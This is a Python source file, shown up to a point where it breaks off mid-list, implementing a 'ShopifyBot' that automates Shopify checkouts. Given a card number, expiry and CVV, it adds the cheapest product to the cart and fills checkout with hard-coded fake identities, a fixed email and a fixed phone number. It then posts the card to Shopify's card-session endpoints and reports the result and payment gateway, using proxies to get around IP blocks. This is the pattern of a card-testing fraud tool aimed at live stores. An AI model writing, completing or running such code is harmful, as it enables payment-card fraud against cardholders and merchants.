import requests
import random
import string
import json
import time
import urllib.parse
import re
import os
import sys
import logging
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama for colored terminal output
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('shopify_bot')

class ShopifyBot:
    def __init__(self, custom_proxy=None):
        """
        Initialize the Shopify Bot with session and proxy configuration.
        
        Args:
            custom_proxy: Optional proxy string in format "ip:port" or "ip:port:user:pass"
        """
        self.session = requests.Session()
        self.retry_count = 0
        self.max_retries = 3
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        # Set default headers for all requests
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
        
        # Store checkout information
        self.product_info = {}
        self.checkout_url = None
        self.checkout_token = None
        self.shipping_url = None
        self.payment_url = None
        
        # Configure proxy if provided
        self.custom_proxy = custom_proxy
        self.configure_proxy()

    def configure_proxy(self):
        """
        Configure the proxy for the session.
        
        Args:
            custom_proxy: Proxy string in format "ip:port" or "ip:port:user:pass"
        """
        if not self.custom_proxy:
            logger.info("No proxy configured")
            return
            
        try:
            parts = self.custom_proxy.split(':')
            if len(parts) == 2:  # IP:PORT format
                proxy_url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:  # IP:PORT:USER:PASS format
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                logger.warning("Invalid proxy format")
                return
                
            self.session.proxies.update({
                'http': proxy_url,
                'https': proxy_url
            })
            logger.info(f"{Fore.GREEN}Proxy configured successfully{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"{Fore.RED}Error configuring proxy: {e}{Style.RESET_ALL}")

    def generate_random_string(self, length):
        """Generate a random string of specified length"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def extract_between(self, text, start, end):
        """Extract text between two markers"""
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return None
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return None
            return text[start_idx:end_idx]
        except Exception:
            return None
            
    def fetch_product_info(self, product_url):
        """
        Fetch product information from a Shopify product URL.
        
        Args:
            product_url: URL of the product page
            
        Returns:
            Dictionary with product information including variants
        """
        logger.info(f"{Fore.BLUE}Fetching product information from: {product_url}{Style.RESET_ALL}")
        
        try:
            response = self.session.get(product_url, timeout=10)
            
            if response.status_code != 200:
                logger.error(f"{Fore.RED}Failed to get product page: {response.status_code}{Style.RESET_ALL}")
                return None
                
            # Parse the HTML content
            soup = BeautifulSoup(response.text, 'lxml')
            
            # Extract product title
            product_title = None
            title_elem = soup.select_one('h1.product-single__title, h1.product__title, h1')
            if title_elem:
                product_title = title_elem.text.strip()
            
            # Extract product price
            product_price = None
            price_elem = soup.select_one('[data-product-price], .price__current, .product__price')
            if price_elem:
                price_text = price_elem.text.strip()
                # Extract digits and decimal point from price text
                price_match = re.search(r'[\d,.]+', price_text)
                if price_match:
                    product_price = price_match.group(0).replace(',', '')
            
            # Extract product variants
            variants = []
            
            # Method 1: Look for variants in JSON data
            json_match = re.search(r'var\s+meta\s*=\s*({.*?});', response.text, re.DOTALL) or \
                         re.search(r'window\.meta\s*=\s*({.*?});', response.text, re.DOTALL) or \
                         re.search(r'var\s+product\s*=\s*({.*?});', response.text, re.DOTALL)
                         
            if json_match:
                try:
                    product_json = json.loads(json_match.group(1))
                    if 'product' in product_json:
                        product_data = product_json['product']
                        if 'variants' in product_data:
                            for variant in product_data['variants']:
                                variant_info = {
                                    'id': variant.get('id'),
                                    'title': variant.get('title'),
                                    'price': variant.get('price'),
                                    'available': variant.get('available', True)
                                }
                                variants.append(variant_info)
                except json.JSONDecodeError:
                    pass
            
            # Method 2: Look for variant options in select elements
            if not variants:
                variant_selects = soup.select('select[name="id"], select[id*="ProductSelect"]')
                for select in variant_selects:
                    for option in select.select('option'):
                        if option.get('value') and not option.get('disabled'):
                            price_text = option.text
                            price_match = re.search(r'[\d,.]+', price_text)
                            price = price_match.group(0).replace(',', '') if price_match else None
                            
                            variant_info = {
                                'id': option.get('value'),
                                'title': option.text.strip(),
                                'price': price,
                                'available': True
                            }
                            variants.append(variant_info)
            
            # If no variants found, create a default variant with the product price
            if not variants:
                # Try to find variant ID in the page
                variant_id_match = re.search(r'"id":(\d+),"available":true', response.text) or \
                                  re.search(r'value="(\d+)"[^>]*>.*?</option>', response.text) or \
                                  re.search(r'name="id"[^>]*value="(\d+)"', response.text)
                                  
                if variant_id_match:
                    variant_id = variant_id_match.group(1)
                    variants.append({
                        'id': variant_id,
                        'title': 'Default',
                        'price': product_price,
                        'available': True
                    })
            
            # Store product information
            self.product_info = {
                'title': product_title,
                'price': product_price,
                'url': product_url,
                'variants': variants,
                'domain': urlparse(product_url).netloc
            }
            
            # Print product information
            logger.info(f"{Fore.GREEN}Product: {product_title}{Style.RESET_ALL}")
            logger.info(f"{Fore.GREEN}Price: {product_price}{Style.RESET_ALL}")
            logger.info(f"{Fore.GREEN}Found {len(variants)} variants{Style.RESET_ALL}")
            
            return self.product_info
            
        except Exception as e:
            logger.error(f"{Fore.RED}Error fetching product info: {e}{Style.RESET_ALL}")
            return None
    
    def find_lowest_price_variant(self):
        """
        Find the variant with the lowest price from the fetched product information.
        
        Returns:
            Dictionary with the lowest-priced variant information
        """
        if not self.product_info or 'variants' not in self.product_info or not self.product_info['variants']:
            logger.error(f"{Fore.RED}No product variants available{Style.RESET_ALL}")
            return None
            
        available_variants = [v for v in self.product_info['variants'] if v.get('available')]
        
        if not available_variants:
            logger.error(f"{Fore.RED}No available variants found{Style.RESET_ALL}")
            return None
            
        # Convert prices to float for comparison
        for variant in available_variants:
            if variant.get('price'):
                try:
                    variant['price_float'] = float(variant['price'])
                except (ValueError, TypeError):
                    variant['price_float'] = float('inf')
            else:
                variant['price_float'] = float('inf')
        
        # Find the lowest-priced variant
        lowest_price_variant = min(available_variants, key=lambda x: x.get('price_float', float('inf')))
        
        logger.info(f"{Fore.GREEN}Selected variant: {lowest_price_variant.get('title')}{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}Price: {lowest_price_variant.get('price')}{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}Variant ID: {lowest_price_variant.get('id')}{Style.RESET_ALL}")
        
        return lowest_price_variant

    def extract_patterns(self, text, patterns):
        results = []
        for pattern in patterns:
            try:
                # Escape special regex characters in the pattern parts
                start_pattern = re.escape(pattern[0])
                end_pattern = re.escape(pattern[1])
                regex_pattern = f"{start_pattern}(.*?){end_pattern}"
                matches = re.findall(regex_pattern, text)
                results.append(matches)
            except Exception as e:
                print(f"Regex error: {str(e)}")
                results.append([])
        return results

    def format_month(self, month):
        return str(int(month)) if month.startswith('0') else month

    def get_user_data(self, nat="US"):
        if nat == "AU":
            return {
                'email': "raven.usu@gmail.com",
                'first_name': "John",
                'last_name': "Smith",
                'city': "Hambidge",
                'street': "56 Bayview Road",
                'state': "South Australia",
                'zip': "5642",
                'country': "Australia"
            }
        else:
            return {
                'email': "raven.usu@gmail.com",
                'first_name': "John",
                'last_name': "Doe",
                'city': "New York",
                'street': "118 W 132nd St",
                'state': "New York",
                'zip': "10027",
                'country': "United States"
            }

    def process_payment(self, cc, month, year, cvv, site_url):
        try:
            print(f"\n=== Processing payment for {cc} on {site_url} ===")
            
            # Format year if needed
            if len(year) <= 2:
                year = f"20{year}"
                print(f"Formatted year to: {year}")
            
            sub_month = self.format_month(month)
            parsed_url = urlparse(site_url)
            domain = parsed_url.netloc
            
            print(f"Domain: {domain}")
            
            # Set up session headers
            cookie_id = self.generate_random_string(10)
            self.session.headers.update({
                'User-Agent': self.user_agent,
                'Host': domain,
                'Origin': f"https://{domain}",
                'Referer': site_url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })

            # Get product page
            print(f"Getting product page: {site_url}")
            response1 = self.session.get(site_url)
            
            if response1.status_code == 430:
                return {'status': False, 'message': 'IP blocked, change IP', 'result': 'Error', 'gateway': 'N/A'}
            
            print(f"Product page status: {response1.status_code}")

            # Try multiple methods to extract variant ID
            variant_id = None
            
            # Method 1: Extract from variants JSON
            variants = self.extract_patterns(response1.text, [['"variants":[{"id":', ',"']])
            if variants and variants[0]:
                variant_id = variants[0][0]
                print(f"Found variant ID from JSON: {variant_id}")
            
            # Method 2: Look for variant ID in form inputs
            if not variant_id:
                variant_match = re.search(r'name="id" value="(\d+)"', response1.text)
                if variant_match:
                    variant_id = variant_match.group(1)
                    print(f"Found variant ID from form input: {variant_id}")
            
            # Method 3: Look for variant ID in data attributes
            if not variant_id:
                variant_match = re.search(r'data-variant-id="(\d+)"', response1.text)
                if variant_match:
                    variant_id = variant_match.group(1)
                    print(f"Found variant ID from data attribute: {variant_id}")
            
            # Method 4: Look for variant ID in JavaScript
            if not variant_id:
                variant_match = re.search(r'variantId\s*:\s*[\'"]?(\d+)[\'"]?', response1.text)
                if variant_match:
                    variant_id = variant_match.group(1)
                    print(f"Found variant ID from JavaScript: {variant_id}")
            
            if not variant_id:
                return {'status': False, 'message': 'No product variants found', 'result': 'Error', 'gateway': 'N/A'}
            
            # Add to cart
            print(f"Adding variant {variant_id} to cart")
            cart_response = self.add_to_cart(domain, variant_id)
            if not cart_response['success']:
                cart_response['result'] = 'Error'
                cart_response['gateway'] = 'N/A'
                return cart_response

            # Get checkout URL
            print("Getting checkout URL")
            checkout_url = self.get_checkout_url(domain)
            if not checkout_url:
                return {'status': False, 'message': 'Failed to get checkout URL', 'result': 'Error', 'gateway': 'N/A'}

            print(f"Checkout URL: {checkout_url}")
            
            # Get user data
            user_data = self.get_user_data()
            print(f"Using email: {user_data['email']}")
            
            # Submit shipping info
            print("Submitting shipping information")
            shipping_response = self.submit_shipping_info(checkout_url, user_data)
            if not shipping_response['success']:
                shipping_response['result'] = shipping_response.get('result', 'Error')
                shipping_response['gateway'] = shipping_response.get('gateway', 'N/A')
                return shipping_response

            # Process card payment
            print(f"Processing card payment for {cc}")
            payment_response = self.process_card_payment(
                checkout_url, domain, cc, month, year, cvv, user_data
            )
            
            # Ensure all required fields are present
            if 'result' not in payment_response:
                payment_response['result'] = 'Unknown'
            
            if 'gateway' not in payment_response:
                payment_response['gateway'] = self.determine_gateway_type(None, checkout_url)
            
            print(f"Payment result: {payment_response.get('result', 'Unknown')}")
            print(f"Gateway: {payment_response.get('gateway', 'Unknown')}")
            print(f"Message: {payment_response.get('message', 'No message')}")
            
            return payment_response

        except Exception as e:
            print(f"Error in process_payment: {str(e)}")
            return {'status': False, 'message': f'Error: {str(e)}', 'result': 'Error', 'gateway': 'N/A'}

    def add_to_cart(self, domain, cart_id):
        # Try multiple cart endpoints to ensure compatibility with different Shopify stores
        cart_endpoints = [
            f"https://{domain}/cart/add.js",
            f"https://{domain}/cart/add",
            f"https://{domain}/cart/add.json"
        ]
        
        data = {
            'id': cart_id,
            'quantity': 1,
            'form_type': 'product'
        }
        
        for endpoint in cart_endpoints:
            try:
                # Try both form data and JSON formats
                response = self.session.post(endpoint, data=data)
                
                # Check if the request was successful
                if response.status_code == 200:
                    # Check if we got a JSON response
                    try:
                        json_response = response.json()
                        if 'items' in json_response or 'id' in json_response:
                            return {'success': True, 'cart_data': json_response}
                    except:
                        pass
                    
                    # If we got redirected to the cart page, it's also a success
                    if '/cart' in response.url:
                        return {'success': True}
                
                # Try with JSON payload
                json_response = self.session.post(endpoint, json=data)
                if json_response.status_code == 200:
                    return {'success': True}
            except Exception as e:
                print(f"Error adding to cart with {endpoint}: {str(e)}")
                continue
        
        # If we've tried all endpoints and none worked, try a direct GET to the cart
        try:
            cart_response = self.session.get(f"https://{domain}/cart")
            if cart_response.status_code == 200:
                return {'success': True}
        except:
            pass
            
        # If we reach here, we couldn't add to cart
        return {'success': False, 'message': 'Failed to add product to cart'}

    def get_checkout_url(self, domain):
        try:
            print(f"Getting checkout URL for domain: {domain}")
            
            # First try the standard checkout endpoint
            response = self.session.get(f"https://{domain}/checkout", allow_redirects=True)
            print(f"Checkout response status: {response.status_code}, URL: {response.url}")
            
            # Check if we were redirected to a checkout URL
            if 'checkout' in response.url:
                parsed_url = urlparse(response.url)
                checkout_path = parsed_url.path
                
                # Extract the checkout token from the URL
                if '/checkouts/' in checkout_path:
                    checkout_url = f"{domain}{checkout_path}"
                    print(f"Found checkout URL from redirect: {checkout_url}")
                    return checkout_url
            
            # If we didn't get redirected, try to extract the location from headers or response
            location = None
            
            # Check for location in response headers
            if 'Location' in response.headers:
                location = response.headers['Location']
                print(f"Found location in headers: {location}")
            
            # If not in headers, try to extract from the response text
            if not location:
                location_patterns = [
                    'location: ', 
                    'location=', 
                    'location:"', 
                    "location:'", 
                    'data-location="'
                ]
                
                for pattern in location_patterns:
                    extracted = self.extract_between(response.text, pattern, '\n')
                    if extracted:
                        location = extracted.strip().strip('"\'')
                        print(f"Found location in response text with pattern '{pattern}': {location}")
                        break
                
            if not location:
                # Try to find checkout URL in the HTML using multiple patterns
                checkout_patterns = [
                    r'action="([^"]*\/checkout[^"]*)"',
                    r'href="([^"]*\/checkout[^"]*)"',
                    r'action=\'([^\']*\/checkout[^\']*)\''
                ]
                
                for pattern in checkout_patterns:
                    checkout_match = re.search(pattern, response.text)
                    if checkout_match:
                        checkout_url = checkout_match.group(1)
                        if checkout_url.startswith('/'):
                            checkout_url = f"{domain}{checkout_url}"
                        print(f"Found checkout URL in HTML with pattern '{pattern}': {checkout_url}")
                        return checkout_url
            
            # If we found a location, parse it
            if location:
                parsed = urlparse(location.strip())
                if parsed.netloc:
                    checkout_url = f"{parsed.netloc}{parsed.path}".rstrip('_')
                else:
                    checkout_url = f"{domain}{parsed.path}".rstrip('_')
                print(f"Parsed location into checkout URL: {checkout_url}")
                return checkout_url
            
            # Try the cart endpoint and look for checkout links
            print("Trying cart endpoint to find checkout links")
            cart_response = self.session.get(f"https://{domain}/cart", allow_redirects=True)
            
            # Look for checkout buttons or forms
            checkout_patterns = [
                r'href="([^"]*\/checkout[^"]*)"',
                r'action="([^"]*\/checkout[^"]*)"',
                r'data-url="([^"]*\/checkout[^"]*)"',
                r'data-checkout-url="([^"]*)"'
            ]
            
            for pattern in checkout_patterns:
                checkout_match = re.search(pattern, cart_response.text)
                if checkout_match:
                    checkout_url = checkout_match.group(1)
                    if checkout_url.startswith('/'):
                        checkout_url = f"{domain}{checkout_url}"
                    print(f"Found checkout URL from cart page with pattern '{pattern}': {checkout_url}")
                    return checkout_url
            
            # Try to find checkout token in the cart page
            token_patterns = [
                r'checkout_token:\s*[\'"]([^\'"]+)[\'"]',
                r'data-checkout-token="([^"]+)"',
                r'name="checkout_token" value="([^"]+)"'
            ]
            
            for pattern in token_patterns:
                token_match = re.search(pattern, cart_response.text)
                if token_match:
                    token = token_match.group(1)
                    checkout_url = f"{domain}/checkout/{token}"
                    print(f"Constructed checkout URL from token: {checkout_url}")
                    return checkout_url
            
            # Try direct checkout with cart.js
            try:
                cart_js_response = self.session.get(f"https://{domain}/cart.js")
                if cart_js_response.status_code == 200:
                    cart_data = cart_js_response.json()
                    if 'token' in cart_data:
                        token = cart_data['token']
                        checkout_url = f"{domain}/checkout/{token}"
                        print(f"Constructed checkout URL from cart.js token: {checkout_url}")
                        return checkout_url
            except Exception as e:
                print(f"Error getting cart.js: {str(e)}")
            
            print("Failed to find checkout URL through all methods")
            return None
        except Exception as e:
            print(f"Error getting checkout URL: {str(e)}")
            return None

    def submit_shipping_info(self, checkout_url, user_data):
        try:
            # First, get the checkout page to extract the authenticity token
            # Make sure checkout_url is properly formatted
            if checkout_url.startswith('https://') or checkout_url.startswith('http://'):
                checkout_page_url = checkout_url
            else:
                checkout_page_url = f"https://{checkout_url}"
                
            print(f"Getting checkout page: {checkout_page_url}")
            checkout_response = self.session.get(checkout_page_url, allow_redirects=True)
            
            if checkout_response.status_code != 200:
                print(f"Failed to get checkout page. Status code: {checkout_response.status_code}")
                return {'success': False, 'message': f'Failed to get checkout page. Status code: {checkout_response.status_code}'}
            
            # Check if we were redirected to a different URL
            if checkout_response.url != checkout_page_url:
                print(f"Redirected to: {checkout_response.url}")
                checkout_page_url = checkout_response.url
            
            # Extract authenticity token from the page
            auth_token = None
            auth_token_patterns = [
                r'name="authenticity_token" value="([^"]+)"',
                r'name="_authenticity_token" value="([^"]+)"',
                r'data-authenticity-token="([^"]+)"',
                r'"authenticity_token":"([^"]+)"'
            ]
            
            for pattern in auth_token_patterns:
                auth_token_match = re.search(pattern, checkout_response.text)
                if auth_token_match:
                    auth_token = auth_token_match.group(1)
                    print(f"Found authenticity token: {auth_token[:10]}...")
                    break
            
            if not auth_token:
                # If we can't find the token, generate a random one as fallback
                auth_token = self.generate_random_string(86)
                print("Using generated authenticity token")
            
            # Check if we need to submit email first (some stores have a separate step)
            if 'checkout[email]' in checkout_response.text and 'shipping_address' not in checkout_response.text:
                # Submit email first
                print(f"Submitting email first: {user_data['email']}")
                email_data = {
                    '_method': 'patch',
                    'authenticity_token': auth_token,
                    'previous_step': '',
                    'step': 'contact_information',
                    'checkout[email]': user_data['email'],
                    'checkout[buyer_accepts_marketing]': '0',
                    'checkout[client_details][browser_width]': '1920',
                    'checkout[client_details][browser_height]': '1080',
                    'checkout[client_details][javascript_enabled]': '1'
                }
                
                # Check if we need to include a remember_me field
                if 'remember_me' in checkout_response.text:
                    email_data['checkout[remember_me]'] = '0'
                
                # Check if we need to include a phone field
                if 'checkout[phone]' in checkout_response.text:
                    email_data['checkout[phone]'] = '9006371822'
                
                email_response = self.session.post(checkout_page_url, data=email_data, allow_redirects=True)
                
                if email_response.status_code != 200:
                    print(f"Failed to submit email. Status code: {email_response.status_code}")
                    return {'success': False, 'message': f'Failed to submit email. Status code: {email_response.status_code}'}
                
                # Get the updated page with shipping address form
                checkout_response = self.session.get(checkout_page_url, allow_redirects=True)
                
                # Re-extract authenticity token
                for pattern in auth_token_patterns:
                    auth_token_match = re.search(pattern, checkout_response.text)
                    if auth_token_match:
                        auth_token = auth_token_match.group(1)
                        print(f"Updated authenticity token: {auth_token[:10]}...")
                        break
            
            # Prepare shipping data
            shipping_data = {
                '_method': 'patch',
                'authenticity_token': auth_token,
                'previous_step': 'contact_information',
                'step': 'shipping_method',
                'checkout[email]': user_data['email'],
                'checkout[shipping_address][first_name]': user_data['first_name'],
                'checkout[shipping_address][last_name]': user_data['last_name'],
                'checkout[shipping_address][address1]': user_data['street'],
                'checkout[shipping_address][city]': user_data['city'],
                'checkout[shipping_address][country]': user_data['country'],
                'checkout[shipping_address][province]': user_data['state'],
                'checkout[shipping_address][zip]': user_data['zip'],
                'checkout[shipping_address][phone]': '9006371822'
            }
            
            # Some Shopify stores require additional fields
            shipping_data['checkout[remember_me]'] = '0'
            shipping_data['checkout[buyer_accepts_marketing]'] = '0'
            shipping_data['checkout[client_details][browser_width]'] = '1920'
            shipping_data['checkout[client_details][browser_height]'] = '1080'
            shipping_data['checkout[client_details][javascript_enabled]'] = '1'
            shipping_data['checkout[shipping_address][company]'] = ''
            shipping_data['checkout[shipping_address][address2]'] = ''
            
            # Submit shipping information
            print(f"Submitting shipping information for {user_data['first_name']} {user_data['last_name']}")
            response = self.session.post(checkout_page_url, data=shipping_data, allow_redirects=True)
            
            if response.status_code != 200:
                print(f"Failed to submit shipping information. Status code: {response.status_code}")
                return {'success': False, 'message': f'Failed to submit shipping information. Status code: {response.status_code}'}
            
            # Check for errors in the response
            error_patterns = [
                r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
                r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
                r'data-error-message="([^"]*)"'
            ]
            
            for pattern in error_patterns:
                error_match = re.search(pattern, response.text, re.DOTALL)
                if error_match:
                    error_message = error_match.group(1).strip()
                    error_message = re.sub(r'<[^>]*>', '', error_message)  # Remove HTML tags
                    print(f"Error in shipping submission: {error_message}")
                    return {'success': False, 'message': f'Shipping error: {error_message}'}
            
            # Check if we need to select a shipping method
            if 'step=shipping_method' in response.url or 'shipping_method' in response.text:
                print("Selecting shipping method")
                # Extract shipping method options
                shipping_method = None
                shipping_method_patterns = [
                    r'data-shipping-method="([^"]+)"',
                    r'id="checkout_shipping_rate_id_([^"]+)"',
                    r'value="([^"]+)" class="radio-input".*?shipping-method',
                    r'data-checkout-total-shipping="[^"]+" data-checkout-shipping-rate-id="([^"]+)"',
                    r'name="checkout\[shipping_rate\]\[id\]" value="([^"]+)"',
                    r'data-shipping-method-label="[^"]+" data-shipping-method-id="([^"]+)"'
                ]
                
                for pattern in shipping_method_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        shipping_method = match.group(1)
                        print(f"Found shipping method: {shipping_method}")
                        break
                
                if shipping_method:
                    # Submit shipping method selection
                    shipping_method_data = {
                        '_method': 'patch',
                        'authenticity_token': auth_token,
                        'previous_step': 'shipping_method',
                        'step': 'payment_method',
                        'checkout[shipping_rate][id]': urllib.parse.unquote(shipping_method),
                        'checkout[email]': user_data['email'],  # Include email again to ensure it's set
                        'checkout[client_details][browser_width]': '1920',
                        'checkout[client_details][browser_height]': '1080',
                        'checkout[client_details][javascript_enabled]': '1'
                    }
                    
                    print(f"Selecting shipping method: {shipping_method}")
                    shipping_method_response = self.session.post(checkout_page_url, data=shipping_method_data, allow_redirects=True)
                    
                    if shipping_method_response.status_code != 200:
                        print(f"Failed to select shipping method. Status code: {shipping_method_response.status_code}")
                        return {'success': False, 'message': f'Failed to select shipping method. Status code: {shipping_method_response.status_code}'}
                    
                    # Check for errors in the response
                    for pattern in error_patterns:
                        error_match = re.search(pattern, shipping_method_response.text, re.DOTALL)
                        if error_match:
                            error_message = error_match.group(1).strip()
                            error_message = re.sub(r'<[^>]*>', '', error_message)  # Remove HTML tags
                            print(f"Error in shipping method selection: {error_message}")
                            return {'success': False, 'message': f'Shipping method error: {error_message}'}
                    
                    # Check if we need to submit billing address
                    if 'billing_address' in shipping_method_response.text and 'different_billing_address' in shipping_method_response.text:
                        # Use same billing address as shipping
                        billing_data = {
                            '_method': 'patch',
                            'authenticity_token': auth_token,
                            'previous_step': 'shipping_method',
                            'step': 'payment_method',
                            'checkout[different_billing_address]': 'false',
                            'checkout[email]': user_data['email'],
                            'checkout[client_details][browser_width]': '1920',
                            'checkout[client_details][browser_height]': '1080',
                            'checkout[client_details][javascript_enabled]': '1'
                        }
                        
                        print("Setting billing address same as shipping")
                        billing_response = self.session.post(checkout_page_url, data=billing_data, allow_redirects=True)
                        
                        if billing_response.status_code != 200:
                            print(f"Failed to set billing address. Status code: {billing_response.status_code}")
                            return {'success': False, 'message': f'Failed to set billing address. Status code: {billing_response.status_code}'}
                        
                        # Check for errors in the response
                        for pattern in error_patterns:
                            error_match = re.search(pattern, billing_response.text, re.DOTALL)
                            if error_match:
                                error_message = error_match.group(1).strip()
                                error_message = re.sub(r'<[^>]*>', '', error_message)  # Remove HTML tags
                                print(f"Error in billing address: {error_message}")
                                return {'success': False, 'message': f'Billing address error: {error_message}'}
                        
                        print("Billing address set successfully")
                        return {'success': True}
                    
                    print("Shipping method selected successfully")
                    return {'success': True}
                else:
                    print("No shipping method found, but continuing anyway")
            
            print("Shipping information submitted successfully")
            return {'success': True}
            
        except Exception as e:
            print(f"Error submitting shipping info: {str(e)}")
            return {'success': False, 'message': f'Error: {str(e)}'}

    def get_shipping_rates(self, checkout_url):
        time.sleep(5)
        # Make sure checkout_url is properly formatted
        if checkout_url.startswith('https://') or checkout_url.startswith('http://'):
            shipping_rates_url = f"{checkout_url}/shipping_rates?step=shipping_method"
        else:
            shipping_rates_url = f"https://{checkout_url}/shipping_rates?step=shipping_method"
            
        print(f"Getting shipping rates from: {shipping_rates_url}")
        response = self.session.get(shipping_rates_url)
        
        shipping_method = self.extract_between(response.text, 'data-shipping-method="', '"')
        payment_gateway = self.extract_between(response.text, '[data-select-gateway=', ']')
        
        if not shipping_method and self.retry_count < self.max_retries:
            self.retry_count += 1
            return self.get_shipping_rates(checkout_url)
        
        return {
            'shipping_method': urllib.parse.unquote(shipping_method) if shipping_method else None,
            'payment_gateway': payment_gateway
        }

    def process_card_payment(self, checkout_url, domain, cc, month, year, cvv, user_data):
        try:
            print(f"Processing card payment for {cc} on {checkout_url}")
            
            # Make sure checkout_url is properly formatted
            if checkout_url.startswith('https://') or checkout_url.startswith('http://'):
                checkout_page_url = checkout_url
            else:
                checkout_page_url = f"https://{checkout_url}"
            
            # Get the payment page to extract necessary tokens and gateway information
            print(f"Getting payment page: {checkout_page_url}")
            payment_page_response = self.session.get(checkout_page_url, allow_redirects=True)
            
            if payment_page_response.status_code != 200:
                print(f"Failed to get payment page. Status code: {payment_page_response.status_code}")
                return {
                    'status': False, 
                    'message': f'Failed to get payment page. Status code: {payment_page_response.status_code}', 
                    'result': 'Error', 
                    'gateway': 'N/A'
                }
            
            # Check if we were redirected to a different URL
            if payment_page_response.url != checkout_page_url:
                print(f"Redirected to: {payment_page_response.url}")
                checkout_page_url = payment_page_response.url
            
            # Extract authenticity token
            auth_token = None
            auth_token_patterns = [
                r'name="authenticity_token" value="([^"]+)"',
                r'name="_authenticity_token" value="([^"]+)"',
                r'data-authenticity-token="([^"]+)"',
                r'"authenticity_token":"([^"]+)"'
            ]
            
            for pattern in auth_token_patterns:
                auth_token_match = re.search(pattern, payment_page_response.text)
                if auth_token_match:
                    auth_token = auth_token_match.group(1)
                    print(f"Found authenticity token: {auth_token[:10]}...")
                    break
            
            if not auth_token:
                # If we can't find the token, generate a random one as fallback
                auth_token = self.generate_random_string(86)
                print("Using generated authenticity token")
            
            # Extract payment gateway
            payment_gateway = None
            gateway_patterns = [
                r'data-select-gateway="([^"]+)"',
                r'data-gateway-name="([^"]+)"',
                r'data-gateway="([^"]+)"',
                r'data-payment-gateway="([^"]+)"',
                r'name="checkout\[payment_gateway\]" value="([^"]+)"',
                r'gateway:\s*[\'"]([^\'"]+)[\'"]',
                r'data-subfields-for-gateway="([^"]+)"'
            ]
            
            for pattern in gateway_patterns:
                match = re.search(pattern, payment_page_response.text)
                if match:
                    payment_gateway = match.group(1)
                    print(f"Found payment gateway: {payment_gateway}")
                    break
            
            # If we couldn't find the payment gateway, try to get shipping rates
            if not payment_gateway:
                print("Getting shipping rates to find payment gateway")
                rates = self.get_shipping_rates(checkout_url)
                payment_gateway = rates.get('payment_gateway')
                if payment_gateway:
                    print(f"Found payment gateway from shipping rates: {payment_gateway}")
            
            # If we still don't have a payment gateway, use a default value
            if not payment_gateway:
                payment_gateway = "shopify_payments"
                print(f"Using default payment gateway: {payment_gateway}")
            
            # Format month and year
            sub_month = self.format_month(month)
            if len(year) <= 2:
                year = f"20{year}"
                print(f"Formatted year to: {year}")
            
            # Extract cart session and cookies
            cart_session = None
            cart_token = None
            checkout_token = None
            
            # Extract cart token from cookies
            for cookie in self.session.cookies:
                if cookie.name == 'cart':
                    cart_token = cookie.value
                    print(f"Found cart token from cookies: {cart_token}")
                    break
            
            # If no cart token in cookies, try to find it in the page
            if not cart_token:
                cart_token_patterns = [
                    r'name="cart_token" value="([^"]+)"',
                    r'data-cart-token="([^"]+)"',
                    r'"cart_token":"([^"]+)"'
                ]
                
                for pattern in cart_token_patterns:
                    match = re.search(pattern, payment_page_response.text)
                    if match:
                        cart_token = match.group(1)
                        print(f"Found cart token from page: {cart_token}")
                        break
            
            # Extract checkout token from URL
            checkout_token_match = re.search(r'/checkouts/([^/?]+)', checkout_page_url)
            if checkout_token_match:
                checkout_token = checkout_token_match.group(1)
                print(f"Found checkout token from URL: {checkout_token}")
            
            # Extract cart session from page
            cart_session_patterns = [
                r'cart_session_id:\s*[\'"]([^\'"]+)[\'"]',
                r'data-cart-session="([^"]+)"',
                r'"cart_session_id":"([^"]+)"'
            ]
            
            for pattern in cart_session_patterns:
                match = re.search(pattern, payment_page_response.text)
                if match:
                    cart_session = match.group(1)
                    print(f"Found cart session: {cart_session}")
                    break
            
            # Extract location path
            location_path = None
            location_patterns = [
                r'location:\s*[\'"]([^\'"]+)[\'"]',
                r'data-location="([^"]+)"',
                r'"location":"([^"]+)"'
            ]
            
            for pattern in location_patterns:
                match = re.search(pattern, payment_page_response.text)
                if match:
                    location_path = match.group(1)
                    print(f"Found location path: {location_path}")
                    break
            
            # Try to process payment with multiple attempts
            for attempt in range(1, 4):
                try:
                    print(f"Payment attempt {attempt}/3")
                    
                    # Prepare card session data
                    card_session_data = {
                        "credit_card": {
                            "number": cc,
                            "name": f"{user_data['first_name']} {user_data['last_name']}",
                            "month": int(sub_month),
                            "year": int(year),
                            "verification_value": cvv
                        },
                        "payment_session_scope": domain
                    }
                    
                    # Try multiple Shopify payment endpoints
                    session_endpoints = [
                        "https://deposit.us.shopifycs.com/sessions",
                        "https://elb.deposit.shopifycs.com/sessions",
                        "https://checkout.shopifycs.com/sessions",
